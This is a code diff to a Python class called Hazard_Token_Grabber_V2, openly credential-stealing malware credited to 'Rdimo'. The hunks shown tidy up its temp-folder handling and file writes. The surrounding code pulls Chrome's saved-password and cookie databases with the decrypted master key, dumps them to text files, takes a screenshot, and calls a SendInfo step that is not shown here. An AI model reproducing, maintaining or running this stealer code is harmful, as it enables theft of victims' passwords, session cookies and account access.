@@ -23,8 +23,7 @@ class Hazard_Token_Grabber_V2:
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
-        except (PermissionError, FileExistsError):
-            shutil.rmtree(self.tempfolder)
+        except:
             pass
 
         self.tokens = []
@@ -39,6 +38,10 @@ class Hazard_Token_Grabber_V2:
         self.screenshot()
         self.SendInfo()
         self.LogOut()
+        try:
+            shutil.rmtree(self.tempfolder)
+        except(PermissionError, FileExistsError):
+            pass
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -98,7 +101,7 @@ class Hazard_Token_Grabber_V2:
     
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Passwords.txt", "w+")
+        f = open (self.tempfolder+"\\Google Passwords.txt", "w")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
@@ -127,7 +130,7 @@ class Hazard_Token_Grabber_V2:
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Cookies.txt", "w+")
+        f = open (self.tempfolder+"\\Google Cookies.txt", "w")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
